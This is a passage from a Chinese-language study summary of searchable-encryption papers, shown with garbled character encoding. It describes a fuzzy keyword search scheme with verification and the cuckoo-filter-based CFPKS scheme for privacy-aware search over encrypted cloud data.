1ã€æ•°æ®æ‰€æœ‰è€…æ‰«ææ•´ä¸ªæ–‡æ¡£ï¼Œæå–æ‰€æœ‰ä¸åŒçš„å…³é”®å­—ï¼Œæ„é€ å…³é”®å­—é›† Wã€‚å¯¹äºæ¯ä¸ªå…³é”®å­— w<sub>i</sub> âˆˆ W(1â‰¤iâ‰¤n)ï¼Œæ•°æ®æ‰€æœ‰è€…æ„é€  F(w<sub>i</sub>)ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒ…å« w<sub>i </sub>çš„æ–‡ä»¶é›†åˆã€‚\n- 2ã€è®¾ v(w<sub>i </sub>)(1â‰¤iâ‰¤n)è¡¨ç¤ºå…³é”®å­— w<sub>i </sub> çš„ç´¢å¼•å‘é‡ã€‚\n  - å¦‚æœ w<sub>i </sub> åœ¨ F<sub>j</sub> (1â‰¤jâ‰¤N) ä¸­ï¼Œåˆ™ v(w<sub>i</sub>)[j] = 1\n  - å¦åˆ™ v(w<sub>i</sub>)[j] = 0\n\n- 3ã€æ•°æ®æ‰€æœ‰è€…ä¸ºæ¯ä¸ªå…³é”®å­— w<sub>i</sub> æ„é€ æ¨¡ç³Šå…³é”®å­—é›†ã€‚ S<sub>w<sub>i,d</sub></sub> è¡¨ç¤ºæœ‰ç¼–è¾‘è·ç¦»çš„ w<sub>i</sub> çš„æ¨¡ç³Šå…³é”®å­—é›†ï¼Œw<sub>i,t</sub> (1â‰¤iâ‰¤n,1â‰¤tâ‰¤|S<sub>w<sub>i,d</sub></sub>|) è¡¨ç¤º S<sub>w<sub>i,d</sub></sub> ä¸­çš„å…³é”®å­—\n- 4ã€æ•°æ®æ‰€æœ‰è€…é€šè¿‡è®¡ç®— C(w<sub>i</sub>) â† SKE.Enc<sub>sk</sub>(F(w<sub>i</sub>))åŠ å¯†æ‰€æœ‰æ–‡ä»¶ã€‚\n  - å¯¹äº S<sub>w<sub>i,d</sub></sub> ä¸­çš„æ¯ä¸ªæ¨¡ç³Šå…³é”®å­—ï¼Œè®¡ç®— Ï€<sub>k<sub>1</sub></sub>(w<sub>i,t</sub>) (1â‰¤iâ‰¤n,1â‰¤tâ‰¤|S<sub>w<sub>i,d</sub></sub>|)ï¼Œå­˜å‚¨åˆ°**ç¬¬ä¸€ä¸ªèŠ‚ç‚¹**ä¸­\n  - æ•°æ®æ‰€æœ‰è€…è®¡ç®— Ev(w<sub>i</sub>)â†f<sub>k2</sub>(Ï€<sub>k<sub>1</sub></sub>(w<sub>i</sub>)) âŠ• v(w<sub>i</sub>)ï¼Œå¹¶å°† Ev(w<sub>i</sub>) å­˜å…¥**ç¬¬äºŒä¸ªèŠ‚ç‚¹**\n  - å¯¹äº S<sub>w<sub>i,d</sub></sub> ä¸­çš„æ‰€æœ‰æ¨¡ç³Šå…³é”®å­—ï¼Œè®¡ç®—ä¸€ä¸ªè®¤è¯æ ‡ç­¾ tag<sub>w<sub>i,t</sub></sub> = MAC(Ï€<sub>k<sub>1</sub></sub>(w<sub>i</sub>)ï¼ŒÏ€<sub>k<sub>1</sub></sub>(w<sub>i,t</sub>)ï¼ŒEv(w<sub>i</sub>)ï¼ŒC(w<sub>i</sub>))ï¼Œå­˜å‚¨åˆ°**ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹**ä¸­\n\n- æœ€åï¼Œæ•°æ®æ‰€æœ‰è€…å°†è¿™äº›é“¾æ¥åˆ—è¡¨å­˜å‚¨åˆ°ä¸€ä¸ªå¤§æ•°ç»„ä¸­ï¼Œè¯¥æ•°ç»„è¢«è§†ä¸ºå®‰å…¨ç´¢å¼• I\n\n#### Trapdoor(K,w')\n\nå½“ç”¨æˆ·éœ€è¦æœç´¢åŒ…å«å…³é”®å­— w' çš„æ–‡æ¡£æ—¶ï¼Œè®¡ç®—å‡ºé™·é—¨ T<sub>w'</sub> = ( Ï€<sub>k<sub>1</sub></sub>(w')ï¼Œf<sub>k<sub>2</sub></sub>(Ï€<sub>k<sub>1</sub></sub>(w')) )ï¼Œå¹¶å‘é€åˆ°äº‘æœåŠ¡å™¨\n\n#### Search(T<sub>w'</sub>,C,I)\n\n- å½“äº‘æœåŠ¡å™¨æ”¶åˆ°é™·é—¨åï¼Œå°† Ï€<sub>k<sub>1</sub></sub>(w') ä¸æ¯ä¸ªåˆ—è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„å…ƒç´ è¿›è¡Œæ¯”è¾ƒã€‚\n- åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨åŠ å¯†çš„ç²¾ç¡®å…³é”®å­— Ï€<sub>k<sub>1</sub></sub>(w<sub>i</sub>) è¡¨ç¤ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹ Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚\n- ä¹Ÿå°±æ˜¯è¯´ï¼Œw<sub>i,1</sub> è¡¨ç¤ºç¡®åˆ‡çš„å…³é”®å­— w<sub>i</sub>ã€‚å¦‚ç®—æ³•1æ‰€ç¤ºï¼Œæˆ‘ä»¬ç”¨ä¸¤ç§æƒ…å†µæ¥æè¿°è¿™ä¸ªè¿‡ç¨‹ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202205251027281.png\" style=\"zoom:67%;\" />\n\n- æƒ…å†µ1ï¼š\n  - Ï€<sub>k<sub>1</sub></sub>(w') ä¸ç­‰äºç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸Šçš„ç¬¬ä¸€ä¸ªå…ƒç´  Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) ï¼Œè€Œç­‰äºç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸Šçš„å¦ä¸€ä¸ªå…ƒç´  Ï€<sub>k<sub>1</sub></sub>(w<sub>i,t</sub>)(1<tâ‰¤|S<sub>w<sub>i,d</sub></sub>|)ï¼Œæ­¤æ—¶ï¼Œäº‘æœåŠ¡å™¨è¿”å› Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) ç»™æ•°æ®ç”¨æˆ·\n  - å½“ç”¨æˆ·æ¥æ”¶åˆ° Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) æ—¶ï¼Œè®¡ç®—å‡º f<sub>k<sub>2</sub></sub>(Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>))ï¼Œå‘é€ç»™äº‘æœåŠ¡å™¨\n  - äº‘æœåŠ¡å™¨é€šè¿‡è®¡ç®— v(w<sub>i</sub>) â† f<sub>k<sub>2</sub></sub>(Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)) âŠ• Ev(w<sub>i</sub>) æ¥è§£å¯†ç¬¬äºŒä¸ªèŠ‚ç‚¹çš„ Ev(w<sub>i</sub>)\n  - å¦‚æœ v(w<sub>i</sub>)[j] = 1 äº‘æœåŠ¡å™¨å°† C<sub>j</sub> æ·»åŠ åˆ° C(w')\n  - ç„¶åäº‘æœåŠ¡å™¨ä»ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹çš„ Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)-th ä½ç½®æå– tag<sub>w'</sub>\n  - æœ€åï¼Œäº‘æœåŠ¡å™¨è¿”å› C(w') å’Œ tag<sub>w'Â </sub>ç»™æ•°æ®ç”¨æˆ·ã€‚\n- æƒ…å†µ2ï¼š\n  - Ï€<sub>k<sub>1</sub></sub>(w') ç­‰äºç¬¬ä¸€å…ƒç´  Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)ï¼Œäº‘æœåŠ¡å™¨é€šè¿‡è®¡ç®— v(w<sub>i</sub>) â† f<sub>k<sub>2</sub></sub>(Ï€<sub>k<sub>1</sub></sub>(w')) âŠ• Ev(w<sub>i</sub>) ç›´æ¥è§£å¯†ç¬¬äºŒä¸ªèŠ‚ç‚¹çš„ Ev(w<sub>i</sub>)ã€‚\n  - å¦‚æœ v(w<sub>i</sub>)[j] = 1 äº‘æœåŠ¡å™¨å°† C<sub>j</sub> æ·»åŠ åˆ°C(w')\n  - ç„¶åäº‘æœåŠ¡å™¨ä»ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹çš„ Ï€<sub>k<sub>1</sub></sub>(w')-th ä½ç½®æå– tag<sub>w'</sub>\n  - æœ€åï¼Œäº‘æœåŠ¡å™¨è¿”å› C(w')ï¼Œtag<sub>w'</sub>ï¼ŒÏ€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)ç»™æ•°æ®ç”¨æˆ·\n\n#### Verify(K,tag<sub>w'</sub>,C(w'),Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>),T<sub>w'</sub>)\n\n- ç”¨æˆ·ä» C(w') ä¸­æå–å‡º v(w') ã€‚\n- å¦‚æœ C<sub>j</sub> åœ¨ C(w') ä¸­ï¼Œåˆ™ v(w') çš„ç¬¬ j ä½ä¸º 1ï¼Œå¦åˆ™ç­‰äº0ã€‚\n- ç”¨æˆ·è®¡ç®— Ev(w') â† f<sub>k<sub>2</sub></sub>(Ï€<sub>k<sub>1</sub></sub>(w')) âŠ• v(w')\n- ç„¶åæ£€æŸ¥ MAC(Ï€<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)ï¼ŒÏ€<sub>k<sub>1</sub></sub>(w')ï¼ŒEv(w')ï¼ŒC(w')) æ˜¯å¦ç­‰äº tag<sub>w'</sub>ï¼Œå¦‚æœæ˜¯åˆ™ç”¨æˆ·æ¥å—ç»“æœï¼Œå¦åˆ™æ‹’ç»ç»“æœã€‚\n\n#### Dec(K,C(w'))\n\nç”¨æˆ·è§£å¯†  C(w') é€šè¿‡è®¡ç®— F(w')â†SKE.Dec<sub>sk</sub> (C(w')) (skâˆˆK)\n\n## â‘¨CFPKSæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠCuckoo-Filter Based Privacy-Aware Search over Encrypted Cloud Dataã€‹**\n\n- ä½œè€…ï¼šè–›æ¸…å¯’ï¼›Mooi Choo Chuah\n- å•ä½ï¼šLehigh University\n- ä¼šè®®ï¼š[2015 11th International Conference on Mobile Ad-hoc and Sensor Networks (MSN)](https://ieeexplore.ieee.org/document/7420926)ã€CCF Cã€‘\n- æ—¶é—´ï¼š2015å¹´12æœˆ\n\n### 1ã€æ€»ä½“æ€è·¯\n\næå‡ºäº†**ä¸€ç§åŸºäºå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨çš„ç§æœ‰å…³é”®å­—æœç´¢æ–¹æ¡ˆï¼ˆCFPKSï¼‰**ï¼Œä»¥å¯¹åŠ å¯†æ•°æ®æä¾›éšç§æ„ŸçŸ¥å…³é”®å­—æœç´¢ã€‚è¯¥ CFPKS æ–¹æ¡ˆä½¿ç”¨åŸºäº**B<sup>ed</sup>-tree ç»“æ„**çš„ç´¢å¼•æ¥**æé«˜æœç´¢æ•ˆç‡**ï¼Œä½¿ç”¨**é€šé…ç¬¦**æ–¹æ³•æ”¯æŒæ¨¡ç³Šå…³é”®å­—æœç´¢ï¼Œå¹¶ä½¿ç”¨ **Cuckoo è¿‡æ»¤å™¨**æ¥æé«˜æœç´¢å‡†ç¡®æ€§å’Œå­˜å‚¨æ•ˆç‡ã€‚æ–¹æ¡ˆå¯ä»¥å¤„ç†æ‹¼å†™é”™è¯¯å’Œ**æŸ¥è¯¢ä¸å¯é“¾æ¥æ€§**ã€‚\n\næœ¬æ–‡çš„ä¸»è¦è´¡çŒ®å½’çº³å¦‚ä¸‹:\n\n- 1.æˆ‘ä»¬æå‡ºäº†ä¸€ç§åŸºäºå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨çš„ç§æœ‰å…³é”®å­—æœç´¢æ–¹æ¡ˆï¼ˆCFPKSï¼‰ï¼Œè¯¥æ–¹æ¡ˆæ”¯æŒ**å¤šè¯å…³é”®å­—æœç´¢**ï¼Œå…·æœ‰é«˜æœç´¢ç²¾åº¦å’Œé«˜æ•ˆå­˜å‚¨;\n- 2.æ–¹æ¡ˆæ—¨åœ¨å¤„ç†æŸ¥è¯¢ä¸­çš„æ‹¼å†™é”™è¯¯ï¼Œå¹¶é€šè¿‡ç”Ÿæˆä¸åŒçš„åŠ å¯†æœç´¢è¯·æ±‚æ¥æä¾›æŸ¥è¯¢ä¸å¯é“¾æ¥æ€§ï¼Œå³ä½¿ä½¿ç”¨ç›¸åŒçš„å…³é”®å­—æœç´¢;\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- B<sup>ed</sup>-tree\n- wildcard\n- å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨\n\n### 3ã€ç›¸å…³è¯´æ˜\n\n#### ç›¸ä¼¼åº¦å…³é”®å­—æœç´¢\n\n- ç»™å®šä¸€ä¸ªåŠ å¯†æ–‡ä»¶é›†åˆ F = {F<sub>1</sub>ï¼ŒF<sub>2</sub>ï¼ŒÂ·Â·Â·}ï¼Œä¸€ç»„ä¸åŒçš„å•è¯ W = {w<sub>1</sub>ï¼Œw<sub>2Â </sub>,Â·Â·Â·, w<sub>p</sub>} å’Œé¢„å®šä¹‰çš„ç¼–è¾‘è·ç¦»é˜ˆå€¼ d\n- ç›¸ä¼¼åº¦æœç´¢æ—¶ï¼Œå¦‚æœ ED(v<sub>wi</sub>,v<sub>wj</sub>) <= dï¼Œåˆ™è¿”å›ä¸€ç»„åŒ…å«å•è¯ wi çš„æ–‡ä»¶æ ‡è¯†ç¬¦\n- w<sub>i</sub> æ˜¯æ•°æ®åº“ä¸­å­˜å‚¨çš„å•è¯ï¼Œå…¶æ•°æ®å‘é‡ä¸º v<sub>wi</sub>\n- w<sub>j</sub> æ˜¯æŸ¥è¯¢ä¸­çš„å•è¯ï¼Œå…¶æ•°æ®å‘é‡ä¸º v<sub>wj</sub>\n\n![](https://img.jwt1399.top/img/image-20220408011217852.png)\n\n#### å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨\n\nä¸€ç§å®ç”¨çš„æ•°æ®ç»“æ„ï¼Œå®ƒæ¯”ç›¸åŒå­˜å‚¨å¤§å°çš„è®¡æ•°è¿‡æ»¤å™¨å’Œä¼ ç»Ÿçš„å¸ƒéš†è¿‡æ»¤å™¨å…·æœ‰æ›´å¥½çš„æœç´¢ç²¾åº¦å’Œæœç´¢æ—¶é—´ã€‚å®ƒç”±ä¸€ä¸ªæ¡¶æ•°ç»„ç»„æˆï¼Œæ¯ä¸ªæ¡¶åŒ…å«å¤šä¸ªæ¡ç›®ã€‚\n\nå¯¹äºæ¯ä¸ªæ•°æ®é¡¹ xï¼Œå“ˆå¸Œæ–¹æ¡ˆè®¡ç®—ä¸¤ä¸ªå€™é€‰æ¡¶ i1 å’Œ i2 çš„ç´¢å¼•ï¼Œè®¾ Fingerprint(x) ä¸º hash(x) çš„æœ€å° k bit\n\n```python\n# Trunc(hash(x),k) è®¡ç®—hash(x)çš„æœ€å° k ä½ã€‚\nFingerprint(x) = Trunc(hash(x),k) \nf = Fingerprint(x)\ni1 = hash(x) mod M\ni2 = (i1 âŠ• hash(f)) mod M\n```\n\n#### B<sup>ed</sup>-treeç»“æ„\n\næ„é€ äº†ä¸€ä¸ªå«ä¸¤ä¸ªå±‚æ¬¡ B<sup>ed</sup>-tree å‹ç´¢å¼•ç»“æ„ï¼Œæ¯ä¸ªä¸­é—´èŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªå¶èŠ‚ç‚¹é›†ç¾¤ä¸å•è¯åœ¨ç‰¹å®šå­—ç¬¦ä¸²çš„é—´éš”ï¼Œå³æ¯ä¸ªä¸­é—´èŠ‚ç‚¹åŒ…å«æ•°æ®çš„ä¸Šä¸‹è¾¹ç•Œå‘é‡(è¡¨ç¤ºä¸º lb[m] å’Œ ub[m] (for 1â‰¤mâ‰¤L))çš„æ‰€æœ‰å¶èŠ‚ç‚¹ä¸‹ã€‚\n\n- æ¯ä¸ª B<sup>ed</sup>-tree çš„å¶èŠ‚ç‚¹åŒ…å«ä¸€ä¸ªæ•°æ®å‘é‡å’Œ hash(w)\n\n- ä¸€ä¸ªå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ï¼Œå®ƒåŒ…å«çš„å•è¯çš„ç¼–è¾‘è·ç¦»ä¸º d åˆ° wï¼Œä»¥åŠåŒ…å«å•è¯ w çš„åŠ å¯†æ–‡ä»¶æ ‡è¯†ç¬¦åˆ—è¡¨ã€‚\n\n- æŸ¥è¯¢è¯å°†æŒ‰ N-gram é¡ºåºè½¬æ¢ä¸ºå‘é‡ v<sub>q</sub>ï¼Œä½¿ç”¨ ED è®¡ç®—å…¬å¼æœç´¢æ¯ä¸ªä¸­é—´èŠ‚ç‚¹çš„ lb[m] å’Œ ub\\[m](1â‰¤mâ‰¤L)ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦æœç´¢è¯¥ä¸­é—´èŠ‚ç‚¹ä¸‹çš„å­èŠ‚ç‚¹ã€‚\n\néšç€å…è®¸çš„çº¦æŸåŒºé—´çš„å¢åŠ (å³ä¸­é—´èŠ‚ç‚¹çš„å‡å°‘)ï¼Œ B<sup>ed</sup>-tree ç»“æ„çš„æ„å»ºæˆæœ¬é™ä½ï¼Œä½†ç”±äºæ¯ä¸ªä¸­é—´èŠ‚ç‚¹å°†é™„åŠ æ›´å¤šçš„å¶èŠ‚ç‚¹ï¼Œæœç´¢æˆæœ¬å°†å¢åŠ \n\n![L buckets for n-gram insertion](https://img.jwt1399.top/img/202205251027136.png)\n\n### 4ã€æ–¹æ¡ˆå®ç°\n\n![](https://img.jwt1399.top/img/image-20220407105531319.png)\n\n#### Setup\n\nåœ¨åˆå§‹åŒ–é˜¶æ®µï¼Œæ•°æ®æ‰€æœ‰è€…ç”Ÿæˆå¯†é’¥ SKï¼ŒSK ç”±ä¸¤éƒ¨åˆ†ç»„æˆ\n\n-  (L+1)Ã—(L+1) éšæœºçŸ©é˜µ Rï¼ŒR ç”¨äºæä¾›æŸ¥è¯¢ä¸å¯é“¾æ¥åŠŸèƒ½\n- å››ä¸ªéšæœºå˜é‡ aã€bã€Nã€k\n- SK = {Rï¼Œaï¼Œbï¼ŒNï¼Œk}\n\n#### GenIndex(L,I,SK,M,e)\n\nè®¾éœ€è¦æ„é€ åŠ å¯†ç´¢å¼•æ ‘çš„å…³é”®å­—é›†åˆ I = {I<sub>1</sub>,I<sub>2</sub>}ï¼Œå…¶ä¸­ I<sub>1Â </sub>ç”¨äºæ„é€ ç¬¬ä¸€å±‚ç±»åˆ«èŠ‚ç‚¹ï¼ŒI<sub>2</sub> ç”¨äºæ„é€ é™„å±çš„ B<sup>ed</sup>-tree ç»“æ„ã€‚é€‰æ‹© SHA-256 ä½œä¸ºæˆ‘ä»¬çš„**é”®æ§å“ˆå¸Œå‡½æ•°**ã€‚æ­¤å¤–ï¼Œä½¿ç”¨ L-element æ•°æ®å‘é‡å’Œ M-bucket å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ï¼Œæ¯ä¸ªæ¡¶ä¸­æœ‰ e ä¸ªæ¡ç›®\n\n- å¯¹äºæ¯ä¸ªåŒ…å«å…³é”®å­— CA<sub>i</sub> çš„ç±»åˆ«èŠ‚ç‚¹ï¼ŒCA<sub>i</sub> âˆˆ I<sub>1</sub>ï¼Œæ‰€æœ‰è€…å°† CA<sub>i</sub> çš„å“ˆå¸Œå€¼çš„æœ€ä½ k ä½æ’å…¥ç´¢å¼•æ ‘ç¬¬ 1 å±‚çš„ M-bucket å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä¸­\n- å¯¹äºæ¯ä¸ªå¶å­èŠ‚ç‚¹åŒ…å«å…³é”®å­— kw<sub>i</sub>ï¼Œå…¶ä¸­ kw<sub>i</sub> âˆˆ I<sub>2</sub>ï¼Œæ‰€æœ‰è€…é€šè¿‡ IndVec(N, kw<sub>i</sub>) å‡½æ•°ç”Ÿæˆ V(kw<sub>i</sub>)ã€‚ç„¶åè®¡ç®—EncVec(kw<sub>i</sub>) = (V(kw<sub>i</sub>),1) Ã— Rï¼Œå…¶ä¸­éšæœºç§˜å¯†çŸ©é˜µRçš„å…ƒç´  âˆˆ [1,L]\n  - IndVec(N,w)ï¼šé€šè¿‡ N-gram è®¡æ•°é¡ºåºè®¡ç®—å•è¯ w çš„ L-bucket æ•°æ®å‘é‡ V(w)ã€‚\n\n- å¯¹äºæ¯ä¸ª kw<sub>i</sub>ï¼Œæ‰€æœ‰è€…è®¡ç®—ä¸€ä¸ªè¡Œå‘é‡ EncHash(kw<sub>i</sub>) = [1/(a\\*hash(kw<sub>i</sub>))ï¼Œ 1/(b*hash(kw<sub>i</sub>))]\n\n- æ‰€æœ‰è€…ç”Ÿæˆä¸€ä¸ªé›†åˆ T<sub>i</sub> = {w<sub>i1</sub> ,Â·Â·Â·, w<sub>ij</sub>Â·Â·Â·}ï¼Œå…¶ä¸­ w<sub>ij</sub> ä¸º kw<sub>i</sub> çš„å•é”™å­—ã€‚å¯¹äºæ¯ä¸ªå…ƒç´  w<sub>ij</sub>ï¼Œå°†å…¶å“ˆå¸Œå€¼çš„æœ€ä½ k ä½æ’å…¥åˆ° M-bucket å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä¸­\n\n- åŠ å¯†çš„æ•°æ®å‘é‡ EncVec(kw)ã€åŠ å¯†çš„å“ˆå¸Œå‘é‡ EncHash(kw)ã€M-bucket å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨å’ŒåŠ å¯†çš„æ–‡ä»¶æ ‡è¯†ç¬¦å­˜å‚¨åœ¨å¶å­èŠ‚ç‚¹ä¸­ã€‚ç„¶åï¼Œåˆ©ç”¨ B<sup>ed</sup>-tree æ„é€ è¿‡ç¨‹ï¼Œè®¡ç®—å‡ºå­˜å‚¨çš„æ‰€æœ‰å…³é”®å­—çš„æ•°æ®å‘é‡ï¼Œæ„é€ åŠ å¯†ç´¢å¼•æ ‘ EncSK(I)ã€‚\n\n#### GenQuery(L,Q,SK)\n\nä¸ºäº†æä¾›æŸ¥è¯¢ä¸å¯é“¾æ¥æ€§ï¼Œæˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ªä¸åŒçš„åŠ å¯†æŸ¥è¯¢ï¼Œå³ä½¿æ˜¯ä½¿ç”¨ç›¸åŒçš„å…³é”®å­—ã€‚å¤§å°ä¸º (L+1)Ã—L çš„æ’åˆ—çŸ©é˜µ Pï¼Œå…¶ä¸­ L æ˜¯æ•°æ®å‘é‡çš„é•¿åº¦ï¼Œç”¨äºæä¾›è¯¥ç‰¹å¾ã€‚å¯¹äº P çš„å‰ L è¡Œï¼Œæ¯ä¸€è¡Œåªæœ‰ä¸€ä¸ªéé›¶å…ƒç´ ã€‚Pçš„æœ€åä¸€è¡ŒåŒ…å«å€¼ä¸º 1 æˆ– -1 çš„å…ƒç´ \n\n- ç»™å®šä¸€ä¸ªæŸ¥è¯¢ Q = {Ca<sub>q</sub>,kw<sub>q</sub>}ï¼Œå…¶ä¸­ Ca<sub>q</sub> æ˜¯ category å…³é”®å­—ï¼Œæ•°æ®ç”¨æˆ·é¦–å…ˆç”Ÿæˆä¸€ä¸ªéšæœºæ•£åˆ—å€¼ï¼Œè¡¨ç¤ºä¸º\n\n  RH(Caq)) = {hash(Ca<sub>q</sub>) + 2k*Î³}ï¼Œå…¶ä¸­ Î³ æ˜¯ä¸€ä¸ªéšæœºå¶æ•°\n\n- ç„¶åæ•°æ®ç”¨æˆ·ç”Ÿæˆ Pï¼Œå¹¶æ„é€ å¤§å°ä¸º (L+1)Ã—L çš„ P'ï¼Œå®ƒåœ¨ç¬¬ 1 ä¸ª L è¡Œä¸­å…·æœ‰ä¸ P ç›¸åŒçš„å…ƒç´ ã€‚P' çš„æœ€åä¸€è¡Œæ˜¯ç”± P çš„æœ€åä¸€è¡Œä¸æ ‡é‡å€¼ Î± ç›¸ä¹˜å¾—åˆ°çš„ï¼Œå…¶ä¸­ Î± âˆˆ [1,L]ã€‚æ¥ä¸‹æ¥ï¼Œæ•°æ®ç”¨æˆ·è¿˜è®¡ç®—(R<sup>âˆ’1</sup> Ã— P')\n\n- å¯¹äºæ¯ä¸ª kw<sub>q</sub>ï¼Œæ•°æ®ç”¨æˆ·ç”Ÿæˆå…¶æ•°æ®å‘é‡ V(kw<sub>q</sub>)ï¼Œç„¶åç”¨ (V(kw<sub>q</sub>)ï¼ŒÎ±))ä¹˜ä»¥ P\n\n- å†ç”Ÿæˆ hash(kw<sub>q</sub>)ï¼Œç„¶åï¼Œä»–å°† hash(kw<sub>q</sub>) æ‹†åˆ†ä¸ºä¸¤ä¸ªéšæœºå€¼ {hash(kw<sub>q</sub>)'ï¼Œhash(kw<sub>q</sub>)\"}ï¼Œè¿™æ · hash(kw<sub>q</sub>) = hash(kw<sub>q</sub>) ' +hash(kw<sub>q</sub>)\"ã€‚æ¥ä¸‹æ¥ï¼Œæ•°æ®ç”¨æˆ·è®¡ç®—åˆ—å‘é‡\n\n  ![](https://img.jwt1399.top/img/202205251027022.png)\n\n  - å…¶ä¸­ g<sub>1</sub> = a\\*(hash(kw<sub>q</sub>)') å’Œ g<sub>2</sub> = b\\*(hash(kw<sub>q</sub>)\")ã€‚å³ä½¿å…³é”®å­—æ˜¯ç›¸åŒçš„ï¼Œè¿™ä¸ª MH(kw<sub>q</sub>) å‘é‡å°†æ˜¯ä¸åŒçš„ï¼Œå› æ­¤æä¾›å…³é”®å­—ä¸å¯é“¾æ¥\n\n- æ•°æ®ç”¨æˆ·è¿˜ç”Ÿæˆä¸€ä¸ªé›†åˆ t<sub>q</sub>= {q<sub>1</sub>ï¼ŒÂ·Â·Â·ï¼Œq<sub>i</sub>ï¼ŒÂ·Â·Â·}ï¼Œå…¶ä¸­ q<sub>iÂ </sub> æ˜¯ kw<sub>q</sub> çš„å•é”™åˆ«å­—ã€‚å¯¹äºæ¯ä¸ªå…ƒç´  q<sub>i </sub>ï¼Œç”Ÿæˆ RH(q<sub>i</sub>) = {hash(q<sub>i</sub>) + 2k*Î³}ï¼Œå…¶ä¸­ Î³ æ˜¯ä¸€ä¸ªéšæœºå¶æ•°ã€‚è¿™ä¸€æ­¥ç¡®ä¿ç›¸åŒçš„ q<sub>i</sub> ä¼šäº§ç”Ÿä¸åŒçš„ RH(q<sub>i</sub>)ï¼Œå› æ­¤æä¾›äº†æ¨¡ç³Šå…³é”®å­—é›†åˆä¸­ä»»ä½•å•è¯çš„ä¸å¯é“¾æ¥æ€§\n- æœ€åå°†åŠ å¯†æœç´¢è¯·æ±‚ EncSK(Q) = { RH(Ca<sub>q</sub>)ï¼Œ(V(kw<sub>q</sub>),Î±) Ã— Pï¼Œ(R<sup>âˆ’1</sup>Ã—P')ï¼Œ MH(kw<sub>q</sub>)ï¼ŒRH(t<sub>q</sub>) }ï¼Œå…¶ä¸­RH(t<sub>q</sub>)={RH(q<sub>1</sub>)ï¼ŒÂ·Â·Â·ï¼ŒRH(q<sub>i</sub>)ï¼ŒÂ·Â·Â·} æäº¤ç»™äº‘æœåŠ¡å™¨ã€‚\n\n#### Search(EncSK(I),EncSK(Q))\n\n![](https://img.jwt1399.top/img/202205251027255.png)\n\n- æœåŠ¡å™¨é¦–å…ˆæ£€æŸ¥å­˜å‚¨åœ¨ç¬¬ä¸€çº§èŠ‚ç‚¹çš„ M-bucket å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä¸­æ˜¯å¦å­˜åœ¨ä»»ä½•æœ€ä½ k ä½ hash çš„ RH(Ca<sub>q</sub>)ã€‚\n- å¦‚æœæ‰¾åˆ°ï¼Œåˆ™ä»æœ€åŒ¹é…çš„ç±»åˆ«èŠ‚ç‚¹ä¸­ï¼Œäº‘æœåŠ¡å™¨åœ¨ bed-tree ç»“æ„ä¸­æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ im(i)ï¼Œå¹¶æ²¿ç€èŠ‚ç‚¹ im(i) ä¸‹çš„å¶å­èŠ‚ç‚¹è¿›è¡Œæœç´¢ï¼Œå¦‚ä¸‹æ‰€ç¤º:\n  - äº‘æœåŠ¡å™¨é¦–å…ˆå°† (V(kw<sub>i</sub>),1) Ã— R ä¸ (R<sup>âˆ’1Â </sup>Ã— P') ç›¸ä¹˜ã€‚ç„¶åå®ƒå°†è®¡ç®— (V(kw<sub>q</sub>),1) Ã— P' å’Œ (V(kw<sub>q</sub>),Î±) Ã— P ä¹‹é—´çš„ç¼–è¾‘è·ç¦»ä½¿ç”¨ ED è®¡ç®—å…¬å¼\n  - å¦‚æœ ED((V(kw<sub>q</sub>),1) Ã— P'ï¼Œ (V(kw<sub>q</sub>),Î±) Ã— P) â‰¤ ç¼–è¾‘è·ç¦»é˜ˆå€¼ dï¼Œåˆ™äº‘æœåŠ¡å™¨å°†æ¯”è¾ƒå­˜å‚¨åœ¨å¶èŠ‚ç‚¹ä¸­çš„åŠ å¯†å“ˆå¸Œå€¼\n\n![](https://img.jwt1399.top/img/image-20220407160519071.png)\n\nå¦‚æœå­˜åœ¨åŒ¹é… Com(EncHash(kw<sub>i</sub>)ï¼ŒMH(kw<sub>q</sub>)) == 1ï¼Œåˆ™è¿”å›å­˜å‚¨åœ¨è¯¥èŠ‚ç‚¹ä¸­çš„æ–‡ä»¶æ ‡è¯†ç¬¦ã€‚\n\nå¦‚æœæ²¡æœ‰ç²¾ç¡®çš„åŒ¹é…ï¼Œåˆ™æœåŠ¡å™¨åˆ¤æ–­å­˜å‚¨çš„å¶èŠ‚ç‚¹çš„ M-bucket å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä¸­æ˜¯å¦å­˜åœ¨æœ€å° k 